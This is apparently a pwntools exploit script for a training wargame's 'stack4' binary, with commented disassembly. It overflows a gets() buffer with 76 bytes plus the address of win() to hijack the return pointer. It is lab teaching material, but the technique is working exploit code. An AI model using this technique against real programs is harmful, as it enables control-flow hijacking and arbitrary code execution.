#   0x08048408 <+0>:	push   ebp
#   0x08048409 <+1>:	mov    ebp,esp
#   0x0804840b <+3>:	and    esp,0xfffffff0
#   0x0804840e <+6>:	sub    esp,0x50
#   0x08048411 <+9>:	lea    eax,[esp+0x10]
#   0x08048415 <+13>:	mov    DWORD PTR [esp],eax
#   0x08048418 <+16>:	call   0x804830c <gets@plt> # vuln
#   0x0804841d <+21>:	leave  
#   0x0804841e <+22>:	ret                         # The goal is to overwrite the saved ret ptr to win()
#
#File stack4/stack4.c:
#11:	int main(int, char **);
#6:	void win(void);

from pwn import *

elf = ELF('./stack4')
p = elf.process()

buf = b'A' * 76
win = p32(elf.symbols['win'])

payload = buf + win

log.info('Overwriting the ret ptr to redirect code exec to win()')

p.sendline(payload)

result = p.recvuntil("changed")
print(result.decode())
